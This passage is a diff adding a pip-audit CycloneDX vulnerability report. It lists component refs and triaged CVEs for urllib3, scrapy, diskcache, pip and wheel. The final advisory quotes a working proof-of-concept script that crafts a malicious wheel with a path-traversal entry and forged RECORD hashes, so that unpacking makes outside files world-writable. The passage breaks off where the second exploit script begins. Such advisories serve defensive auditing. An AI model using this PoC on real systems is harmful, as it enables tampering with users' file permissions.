+      "ref": "BomRef.6698483671929538.9653892868675893"
+    },
+    {
+      "ref": "BomRef.3723327241497174.309097402086294"
+    },
+    {
+      "ref": "BomRef.09177584847033238.70015606961183"
+    },
+    {
+      "ref": "BomRef.8223642798415424.10570111062089349"
+    },
+    {
+      "ref": "BomRef.2652226303293489.2398039846203388"
+    },
+    {
+      "ref": "BomRef.26780455877374176.04738862071918648"
+    },
+    {
+      "ref": "BomRef.7302783961017599.7048558970411701"
+    },
+    {
+      "ref": "BomRef.6288296886877667.5449258659724345"
+    },
+    {
+      "ref": "BomRef.1550531376037534.8666194501174131"
+    },
+    {
+      "ref": "BomRef.2961402396529693.851444420697022"
+    },
+    {
+      "ref": "BomRef.07052823218114124.2919568246686923"
+    },
+    {
+      "ref": "BomRef.6429422437189334.05896434286260843"
+    },
+    {
+      "ref": "BomRef.334587743139923.315512522877189"
+    },
+    {
+      "ref": "BomRef.2067921432836719.24839245748935335"
+    },
+    {
+      "ref": "BomRef.9592289207934286.37516811701254804"
+    },
+    {
+      "ref": "BomRef.10325493459532153.8977535689774467"
+    },
+    {
+      "ref": "BomRef.38437526191247384.004392849404481702"
+    },
+    {
+      "ref": "BomRef.33314542642499156.9077398292916854"
+    },
+    {
+      "ref": "BomRef.2209968963063096.43647424375769595"
+    },
+    {
+      "ref": "BomRef.45926366237618754.18848025185914263"
+    },
+    {
+      "ref": "BomRef.9336936343715291.8923109232951609"
+    },
+    {
+      "ref": "BomRef.06262618373286521.2407643969172758"
+    },
+    {
+      "ref": "BomRef.8472962699608193.2934568320108283"
+    },
+    {
+      "ref": "BomRef.9687249367495939.1447691742833228"
+    },
+    {
+      "ref": "BomRef.7273849892805279.6325004084240792"
+    },
+    {
+      "ref": "BomRef.010154486488466952.3526646676370784"
+    },
+    {
+      "ref": "BomRef.5449242339411928.23832487857315476"
+    },
+    {
+      "ref": "BomRef.9336170147130805.7011528964754757"
+    },
+    {
+      "ref": "BomRef.32417504882966597.6504344414140852"
+    },
+    {
+      "ref": "BomRef.49943049250835514.7514483360394814"
+    },
+    {
+      "ref": "BomRef.4279613999652101.3992802392265955"
+    },
+    {
+      "ref": "BomRef.7456085849017007.011753800618366506"
+    },
+    {
+      "ref": "BomRef.4744781349454962.40217015563630787"
+    },
+    {
+      "ref": "BomRef.6371117874664933.04401054078701849"
+    },
+    {
+      "ref": "BomRef.4342076651682131.21690725576926673"
+    },
+    {
+      "ref": "BomRef.18638882238546917.874674103629944"
+    },
+    {
+      "ref": "BomRef.7667236781064719.028458090738603836"
+    },
+    {
+      "ref": "BomRef.10851007190791406.33197246456153984"
+    },
+    {
+      "ref": "BomRef.988650155567904.8386361096330492"
+    },
+    {
+      "ref": "BomRef.9456370722121902.4816657711517901"
+    },
+    {
+      "ref": "BomRef.4485779396483873.8129747844177615"
+    },
+    {
+      "ref": "BomRef.24098521751343494.5947270938035923"
+    },
+    {
+      "ref": "BomRef.17681384238750208.2658779804842276"
+    },
+    {
+      "ref": "BomRef.35872574899681686.5545983332197182"
+    },
+    {
+      "ref": "BomRef.841607347107142.4495215404845586"
+    },
+    {
+      "ref": "BomRef.3433712075905734.9728119525898922"
+    },
+    {
+      "ref": "BomRef.31385868342907564.7732575575094212"
+    },
+    {
+      "ref": "BomRef.44559445016458554.5845598997211571"
+    },
+    {
+      "ref": "BomRef.23366707260732333.010393571782465028"
+    },
+    {
+      "ref": "BomRef.8948609131463748.47865356064861797"
+    },
+    {
+      "ref": "BomRef.5630927283423055.9437971197845166"
+    },
+    {
+      "ref": "BomRef.19828594182433756.68338594930401"
+    },
+    {
+      "ref": "BomRef.8573132819289329.04405311175946236"
+    },
+    {
+      "ref": "BomRef.5563040679639623.8860460765578066"
+    },
+    {
+      "ref": "BomRef.9708146598351138.44032328870595194"
+    },
+    {
+      "ref": "BomRef.43473010646745036.8478663837530032"
+    },
+    {
+      "ref": "BomRef.4311480650420334.640217068555419"
+    },
+    {
+      "ref": "BomRef.34956817195670786.5743547557006515"
+    },
+    {
+      "ref": "BomRef.811046580613624.4143670359267748"
+    },
+    {
+      "ref": "BomRef.19040914936702158.8381019429505314"
+    },
+    {
+      "ref": "BomRef.5435348315733365.3494124719869227"
+    },
+    {
+      "ref": "BomRef.6557836122287675.4294220273091769"
+    },
+    {
+      "ref": "BomRef.8885166861113051.5279387129118082"
+    },
+    {
+      "ref": "BomRef.75987137589612.4077066870823103"
+    },
+    {
+      "ref": "BomRef.3241547980546742.19848044266631637"
+    },
+    {
+      "ref": "BomRef.1338296797948879.5331119455395564"
+    },
+    {
+      "ref": "BomRef.2944032199613651.571166625738238"
+    },
+    {
+      "ref": "BomRef.9662073394697025.24865555443876397"
+    },
+    {
+      "ref": "BomRef.1442054769246126.14998569573574827"
+    },
+    {
+      "ref": "BomRef.7016817105710799.30650724749157776"
+    },
+    {
+      "ref": "BomRef.8081877243231597.5092968403337687"
+    },
+    {
+      "ref": "BomRef.06319531058942951.5687544412679161"
+    },
+    {
+      "ref": "BomRef.754409554284475.5784670481064944"
+    },
+    {
+      "ref": "BomRef.9274162826301039.6410544586896191"
+    },
+    {
+      "ref": "BomRef.5334944336193773.7479119188141957"
+    },
+    {
+      "ref": "BomRef.9701306255160884.5233335085825244"
+    },
+    {
+      "ref": "BomRef.9337678789522266.20175990751529327"
+    },
+    {
+      "ref": "BomRef.7926514950408837.13113854406218306"
+    },
+    {
+      "ref": "BomRef.9422698995064179.7347441187218848"
+    },
+    {
+      "ref": "BomRef.7482476015349585.4402205259170804"
+    },
+    {
+      "ref": "BomRef.861082846952857.010389210417035333"
+    },
+    {
+      "ref": "BomRef.8319402348035155.10228700976665162"
+    },
+    {
+      "ref": "BomRef.01805950575734272.38510236795658437"
+    },
+    {
+      "ref": "BomRef.12437448796311479.28804710443969717"
+    },
+    {
+      "ref": "BomRef.9070410012409861.6125228329166341"
+    },
+    {
+      "ref": "BomRef.30745997145842163.6678328331664344"
+    },
+    {
+      "ref": "BomRef.41616039565265295.18861572227212786"
+    },
+    {
+      "ref": "BomRef.9686473725515016.013255072972088167"
+    },
+    {
+      "ref": "BomRef.4164722017473196.8162399892286701"
+    },
+    {
+      "ref": "BomRef.3963849206411214.08796815034995675"
+    },
+    {
+      "ref": "BomRef.579264171488519.8686211378119338"
+    },
+    {
+      "ref": "BomRef.8472967456786249.6973084347730804"
+    },
+    {
+      "ref": "BomRef.6072419780578482.22221250975587437"
+    },
+    {
+      "ref": "BomRef.6496975321194057.1387237097740337"
+    },
+    {
+      "ref": "BomRef.2352740422146954.3745541437141965"
+    },
+    {
+      "ref": "BomRef.2250772045421825.030169959315049177"
+    },
+    {
+      "ref": "BomRef.779125728162439.4935373972250985"
+    },
+    {
+      "ref": "BomRef.12702052472199032.8232069640325718"
+    },
+    {
+      "ref": "BomRef.05837449668827466.8461939490514664"
+    },
+    {
+      "ref": "BomRef.2021792426497877.6623174370480466"
+    },
+    {
+      "ref": "BomRef.06724512688769213.37786097972648136"
+    },
+    {
+      "ref": "BomRef.9271570650782665.19700047668194398"
+    },
+    {
+      "ref": "BomRef.6451879738739895.4919543126124515"
+    },
+    {
+      "ref": "BomRef.720329640797332.7382830077292752"
+    },
+    {
+      "ref": "BomRef.09798463972573956.6755810794920392"
+    },
+    {
+      "ref": "BomRef.1770343150578222.9624007689284747"
+    },
+    {
+      "ref": "BomRef.3261519405105291.05813510863812554"
+    },
+    {
+      "ref": "BomRef.5870154983257475.4458431452651074"
+    },
+    {
+      "ref": "BomRef.46182372469935584.5520431902240848"
+    },
+    {
+      "ref": "BomRef.7987973079472684.05823186279484727"
+    },
+    {
+      "ref": "BomRef.25292782141063175.6153503372301186"
+    },
+    {
+      "ref": "BomRef.717121616276723.8602783180693614"
+    },
+    {
+      "ref": "BomRef.587176482416859.6197632466075353"
+    },
+    {
+      "ref": "BomRef.6104714485247621.9835494485676799"
+    },
+    {
+      "ref": "BomRef.02354572132245092.5753812390571666"
+    },
+    {
+      "ref": "BomRef.38487635044843294.292295619126386"
+    },
+    {
+      "ref": "BomRef.5691997507207436.830880580069127"
+    },
+    {
+      "ref": "BomRef.9728830510655153.924651012868287"
+    },
+    {
+      "ref": "BomRef.7350331000158663.3878176656168951"
+    },
+    {
+      "ref": "BomRef.9797278520533581.402195191813713"
+    },
+    {
+      "ref": "BomRef.49748902082894675.42820375008502654"
+    },
+    {
+      "ref": "BomRef.08973940682579495.5013426848565821"
+    },
+    {
+      "ref": "BomRef.39145783708191273.9408091450511974"
+    },
+    {
+      "ref": "BomRef.9300661194791731.48500666423299954"
+    },
+    {
+      "ref": "BomRef.1552349967152219.501083430468671"
+    },
+    {
+      "ref": "BomRef.6465151282523582.9330649332047797"
+    },
+    {
+      "ref": "BomRef.7582811194440576.410090447001055"
+    },
+    {
+      "ref": "BomRef.9135279342794274.1355577781786823"
+    },
+    {
+      "ref": "BomRef.5556184671098441.14923768708012064"
+    },
+    {
+      "ref": "BomRef.9917435452359389.36329273715532506"
+    },
+    {
+      "ref": "BomRef.4230937911038558.5074007631133205"
+    },
+    {
+      "ref": "BomRef.8744064817273383.8742671724991278"
+    },
+    {
+      "ref": "BomRef.7629190855858623.3374261976428127"
+    },
+    {
+      "ref": "BomRef.2696672733350667.7661934265947816"
+    },
+    {
+      "ref": "BomRef.29481628186263464.8461984843789991"
+    },
+    {
+      "ref": "BomRef.2592422310678406.2580190772266703"
+    },
+    {
+      "ref": "BomRef.9576441353919534.5123564319878948"
+    },
+    {
+      "ref": "BomRef.6030781796244208.46138985146610656"
+    },
+    {
+      "ref": "BomRef.7676392611300372.7488252955102862"
+    },
+    {
+      "ref": "BomRef.3149573137125017.24501067686993283"
+    },
+    {
+      "ref": "BomRef.9047274773231516.5461310582531346"
+    },
+    {
+      "ref": "BomRef.6343716890864213.5998587305397035"
+    },
+    {
+      "ref": "BomRef.6225752196998329.8517922922544766"
+    },
+    {
+      "ref": "BomRef.5142567998301483.3544682097061016"
+    },
+    {
+      "ref": "BomRef.24840603000491124.7082078036919259"
+    },
+    {
+      "ref": "BomRef.9195193586321107.5141346347272304"
+    },
+    {
+      "ref": "BomRef.6514012459337926.5984854196141284"
+    },
+    {
+      "ref": "BomRef.599478257838803.7049706755714126"
+    },
+    {
+      "ref": "BomRef.1232534426868862.9193396836575126"
+    },
+    {
+      "ref": "BomRef.6122101284362443.8056980729182535"
+    },
+    {
+      "ref": "BomRef.2658651432261139.8288997428011535"
+    },
+    {
+      "ref": "BomRef.9369312204481453.5384321565195109"
+    },
+    {
+      "ref": "BomRef.28182012607901297.9572384284922795"
+    },
+    {
+      "ref": "BomRef.38595912296529555.07253599178437298"
+    },
+    {
+      "ref": "BomRef.22673706122354997.7483964151938735"
+    },
+    {
+      "ref": "BomRef.39138665252898963.1250823660138335"
+    },
+    {
+      "ref": "BomRef.35632286890168474.3723756897832252"
+    },
+    {
+      "ref": "BomRef.6922159754949192.9047965879331773"
+    },
+    {
+      "ref": "BomRef.858810609902812.37266614152332755"
+    },
+    {
+      "ref": "BomRef.31652707546995296.2180802241129044"
+    },
+    {
+      "ref": "BomRef.019082170549975297.9291389777076323"
+    },
+    {
+      "ref": "BomRef.5659424187059464.4928730766530436"
+    },
+    {
+      "ref": "BomRef.022410191733870932.01960440319848189"
+    },
+    {
+      "ref": "BomRef.28059874351196745.767159206900313"
+    },
+    {
+      "ref": "BomRef.6201848029673364.9101133071931095"
+    },
+    {
+      "ref": "BomRef.664570149020911.03753545723489771"
+    },
+    {
+      "ref": "BomRef.4510784328091032.2207737467880917"
+    },
+    {
+      "ref": "BomRef.4345060661378718.8381296819312538"
+    },
+    {
+      "ref": "BomRef.7188153951979083.4174678594274315"
+    },
+    {
+      "ref": "BomRef.6228883299066237.9047889273850208"
+    },
+    {
+      "ref": "BomRef.45023341373442616.23894122518406502"
+    },
+    {
+      "ref": "BomRef.39283480552174765.5800088396858379"
+    },
+    {
+      "ref": "BomRef.9160168926916056.39201837509347437"
+    },
+    {
+      "ref": "BomRef.7228119789404.3665090678819626"
+    },
+    {
+      "ref": "BomRef.633450270441953.5867116596075429"
+    },
+    {
+      "ref": "BomRef.251140291695769.3287300805063993"
+    },
+    {
+      "ref": "BomRef.6262703656466881.6033802627576683"
+    },
+    {
+      "ref": "BomRef.5810476887023769.930196477753474"
+    },
+    {
+      "ref": "BomRef.8354901972557974.16502068084101773"
+    },
+    {
+      "ref": "BomRef.6071560231727254.16213957651931554"
+    },
+    {
+      "ref": "BomRef.8130066318778998.9345639763146445"
+    },
+    {
+      "ref": "BomRef.2191743996958927.1668452679671487"
+    },
+    {
+      "ref": "BomRef.38496166801645504.2927582408668672"
+    },
+    {
+      "ref": "BomRef.9922659683423632.03036274813251061"
+    },
+    {
+      "ref": "BomRef.7575177082952373.29994538569840956"
+    },
+    {
+      "ref": "BomRef.5426084335681873.9841720175440686"
+    },
+    {
+      "ref": "BomRef.7694253682450548.8848235691141807"
+    },
+    {
+      "ref": "BomRef.34875848110163954.6409500569198558"
+    },
+    {
+      "ref": "BomRef.7637256031451053.24061171842307005"
+    },
+    {
+      "ref": "BomRef.1860848757539184.4650379383263302"
+    },
+    {
+      "ref": "BomRef.4681639498418452.05206518358094325"
+    },
+    {
+      "ref": "BomRef.9890937650424876.7121058424320219"
+    },
+    {
+      "ref": "BomRef.33330575119122685.5014855341739134"
+    },
+    {
+      "ref": "BomRef.6586321340847697.1976276883252137"
+    },
+    {
+      "ref": "BomRef.25429108306809733.8003799382683796"
+    },
+    {
+      "ref": "BomRef.704088093764095.7760909779616184"
+    },
+    {
+      "ref": "BomRef.26506605804104766.13246688449240374"
+    },
+    {
+      "ref": "BomRef.6041111199964307.02752392159122241"
+    },
+    {
+      "ref": "BomRef.1141172225962307.24400437958411825"
+    },
+    {
+      "ref": "BomRef.022409294773899635.7382151611756191"
+    },
+    {
+      "ref": "BomRef.5375461063470047.011970853991172481"
+    },
+    {
+      "ref": "BomRef.528456616792141.9954702253936597"
+    },
+    {
+      "ref": "BomRef.7629692384863784.11326617643385506"
+    },
+    {
+      "ref": "BomRef.5458530992001009.863285727134259"
+    },
+    {
+      "ref": "BomRef.7538445110049198.7342245678027031"
+    },
+    {
+      "ref": "BomRef.10434496961439865.2631399000020477"
+    },
+    {
+      "ref": "BomRef.359711650765994.5257775042454039"
+    },
+    {
+      "ref": "BomRef.32990302167500396.5578222877852405"
+    },
+    {
+      "ref": "BomRef.1603404326211899.5210962032427249"
+    },
+    {
+      "ref": "BomRef.4474530248011891.8769338830416918"
+    },
+    {
+      "ref": "BomRef.6836995366901549.01878505088619442"
+    },
+    {
+      "ref": "BomRef.6281419308705509.8542907574234969"
+    },
+    {
+      "ref": "BomRef.6112486003114409.32761270245788865"
+    },
+    {
+      "ref": "BomRef.26158997905341086.37259311120936733"
+    },
+    {
+      "ref": "BomRef.5381095263485293.5129437826677646"
+    },
+    {
+      "ref": "BomRef.3340603481168395.48319102400797576"
+    },
+    {
+      "ref": "BomRef.0789074045763557.7444434593473682"
+    },
+    {
+      "ref": "BomRef.4976318080328097.5611758437457336"
+    },
+    {
+      "ref": "BomRef.8735383760668686.004137548580503969"
+    },
+    {
+      "ref": "BomRef.6622978047435109.1305648228646048"
+    },
+    {
+      "ref": "BomRef.1393266863984678.9872355150873365"
+    },
+    {
+      "ref": "BomRef.6814782059028809.7898460463459825"
+    },
+    {
+      "ref": "BomRef.08966798540877374.2137200042910301"
+    },
+    {
+      "ref": "BomRef.07542359636787832.5891975123129473"
+    },
+    {
+      "ref": "BomRef.7147577495141438.17258040718472722"
+    },
+    {
+      "ref": "BomRef.3729869130040807.4780404198148174"
+    },
+    {
+      "ref": "BomRef.26253072069777084.40429761881259396"
+    },
+    {
+      "ref": "BomRef.7745454547570858.9355394866192387"
+    },
+    {
+      "ref": "BomRef.18258179730968338.999673540179026"
+    },
+    {
+      "ref": "BomRef.1595444477425796.8223726610599607"
+    },
+    {
+      "ref": "BomRef.23067824671089676.07706046656727916"
+    },
+    {
+      "ref": "BomRef.472528642211404.5483357250985846"
+    },
+    {
+      "ref": "BomRef.39442141446026746.68764303378927"
+    },
+    {
+      "ref": "BomRef.43371881652302346.41211326500156853"
+    },
+    {
+      "ref": "BomRef.13418837852384946.12199783499009176"
+    },
+    {
+      "ref": "BomRef.35315229839955664.4283520956454381"
+    },
+    {
+      "ref": "BomRef.254990149815556.5203810252662802"
+    },
+    {
+      "ref": "BomRef.8345998620946423.4112790739140211"
+    },
+    {
+      "ref": "BomRef.3253379370482975.6359347640826057"
+    },
+    {
+      "ref": "BomRef.5250143275322442.22358873815678704"
+    },
+    {
+      "ref": "BomRef.03243743178815206.5553820884367809"
+    },
+    {
+      "ref": "BomRef.7491307977598876.660670869706237"
+    },
+    {
+      "ref": "BomRef.6095908630779834.9605107509983167"
+    },
+    {
+      "ref": "BomRef.22634543286234743.49823381273247935"
+    },
+    {
+      "ref": "BomRef.811952505385406.4058370068436363"
+    },
+    {
+      "ref": "BomRef.9827069132322223.2439907913121271"
+    },
+    {
+      "ref": "BomRef.937558534494412.8741801888260963"
+    },
+    {
+      "ref": "BomRef.8313725339338087.47059667866772215"
+    },
+    {
+      "ref": "BomRef.5607126276326515.04608409043692829"
+    },
+    {
+      "ref": "BomRef.24559620673761584.33035816911358284"
+    },
+    {
+      "ref": "BomRef.1247542622160347.0976143998734289"
+    },
+    {
+      "ref": "BomRef.9276259671241577.768504841674807"
+    },
+    {
+      "ref": "BomRef.829163788215753.07828413010081292"
+    },
+    {
+      "ref": "BomRef.5993119347901065.6663825865366596"
+    },
+    {
+      "ref": "BomRef.046510141288874984.01857436200567686"
+    },
+    {
+      "ref": "BomRef.09051429877311279.34243536278646014"
+    },
+    {
+      "ref": "BomRef.9784661808660364.4862130374944126"
+    },
+    {
+      "ref": "BomRef.8942720318260949.1646266614538655"
+    },
+    {
+      "ref": "BomRef.9903771935616382.2822027374757755"
+    },
+    {
+      "ref": "BomRef.04536077794071103.3999497357469197"
+    },
+    {
+      "ref": "BomRef.5568885218356033.2465917507702714"
+    },
+    {
+      "ref": "BomRef.3105500544967573.9677341414491492"
+    },
+    {
+      "ref": "BomRef.8517778503134851.2547305501360233"
+    }
+  ],
+  "metadata": {
+    "timestamp": "2026-06-10T19:09:59.135846+00:00",
+    "component": {
+      "name": "pip-audit",
+      "type": "application"
+    }
+  },
+  "serialNumber": "urn:uuid:97d44bf3-ca77-49a8-aa08-d66a73dec860",
+  "version": 1,
+  "vulnerabilities": [
+    {
+      "affects": [
+        {
+          "ref": "BomRef.09444145998354614.6364215990415449"
+        }
+      ],
+      "bom-ref": "BomRef.09400606241636222.5911667211722805",
+      "description": "Scrapy versions up to 2.13.3 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression. Mitigation for this vulnerability needs security enhancement added in brotli v1.2.0.",
+      "id": "CVE-2025-6176",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5250143275322442.22358873815678704"
+        }
+      ],
+      "bom-ref": "BomRef.5287155151380347.1077982601677221",
+      "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content.",
+      "id": "CVE-2025-66418",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5250143275322442.22358873815678704"
+        }
+      ],
+      "bom-ref": "BomRef.8430875996142287.22579172338085762",
+      "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).",
+      "id": "CVE-2025-66471",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.9222667672474304.5194057883850017"
+        }
+      ],
+      "bom-ref": "BomRef.2789965642554473.10135696745407652",
+      "description": "DiskCache (python-diskcache) through 5.6.3 uses Python pickle for serialization by default. An attacker with write access to the cache directory can achieve arbitrary code execution when a victim application reads from the cache.",
+      "id": "CVE-2025-69872",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5556184671098441.14923768708012064"
+        }
+      ],
+      "bom-ref": "BomRef.5095199968082469.7214695576686913",
+      "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.",
+      "id": "CVE-2025-8869",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5556184671098441.14923768708012064"
+        }
+      ],
+      "bom-ref": "BomRef.21589321088829982.41274073602644346",
+      "description": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.",
+      "id": "CVE-2026-1703",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5250143275322442.22358873815678704"
+        }
+      ],
+      "bom-ref": "BomRef.5239364076416978.26828844121895334",
+      "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.",
+      "id": "CVE-2026-21441",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.24559620673761584.33035816911358284"
+        }
+      ],
+      "bom-ref": "BomRef.2253278602337393.8919398732916154",
+      "description": "### Summary  - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.    - **Root Cause Component:** wheel.cli.unpack.unpack function.    - **Affected Packages:**      1. wheel (Upstream source)      2. setuptools (Downstream, vendors wheel)    - **Severity:** High (Allows modifying system file permissions).    ### Details   The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.   ``` # Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel) for zinfo in wf.filelist:     wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile      # (2) VULNERABILITY:     # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.     # If zinfo.filename contains \"../\", this targets files outside the destination.     permissions = zinfo.external_attr >> 16 & 0o777     destination.joinpath(zinfo.filename).chmod(permissions) ```    ### PoC   I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.    **Prerequisites:** pip install setuptools    **Step 1: Generate the Malicious Wheel (gen_poc.py)**   This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.   ``` import zipfile import hashlib import base64 import os  def urlsafe_b64encode(data):     \"\"\"     Helper function to encode data using URL-safe Base64 without padding.     Required by the Wheel file format specification.     \"\"\"     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')  def get_hash_and_size(data_bytes):     \"\"\"     Calculates SHA-256 hash and size of the data.     These values are required to construct a valid 'RECORD' file,     which is used by the 'wheel' library to verify integrity.     \"\"\"     digest = hashlib.sha256(data_bytes).digest()     hash_str = \"sha256=\" + urlsafe_b64encode(digest)     return hash_str, str(len(data_bytes))  def create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):     print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")      # 1. Prepare Standard Metadata Content     # These are minimal required contents to make the wheel look legitimate.     wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"     metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"         # 2. Define Malicious Payload (Path Traversal)     # The content doesn't matter, but the path does.     payload_content = b\"PWNED by Path Traversal\"      # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'     # The vulnerability allows 'chmod' to affect this path directly.     malicious_path = \"../../poc_target.txt\"      # 3. Calculate Hashes for Integrity Check Bypass     # The 'wheel' library verifies if the file hash matches the RECORD entry.     # To bypass this check, we calculate the correct hash for our malicious file.     wheel_hash, wheel_size = get_hash_and_size(wheel_content)     metadata_hash, metadata_size = get_hash_and_size(metadata_content)     payload_hash, payload_size = get_hash_and_size(payload_content)      # 4. Construct the 'RECORD' File     # The RECORD file lists all files in the wheel with their hashes.     # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.     # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.     record_lines = [         f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",         f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",         f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path         \"evil-1.0.dist-info/RECORD,,\"     ]     record_content = \"\\n\".join(record_lines).encode('utf-8')      # 5. Build the Zip File     with zipfile.ZipFile(filename, \"w\") as zf:         # Write standard metadata files         zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)         zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)         zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)          # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file         # We need to set specific permission bits to trigger the vulnerability.         zinfo = zipfile.ZipInfo(malicious_path)                 # Set external attributes to 0o777 (rwxrwxrwx)         # Upper 16 bits: File type (0o100000 = Regular File)         # Lower 16 bits: Permissions (0o777 = World Writable)         # The vulnerable 'unpack' function will blindly apply this '777' to the system file.         zinfo.external_attr = (0o100000 | 0o777) << 16                 zf.writestr(zinfo, payload_content)      print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")  if __name__ == \"__main__\":     create_evil_wheel_v4() ```    **Step 2: Run the Exploit (exploit.py)**   ``` from pathlib import Path import sys  # Demonstrating impact on setuptools try:     from 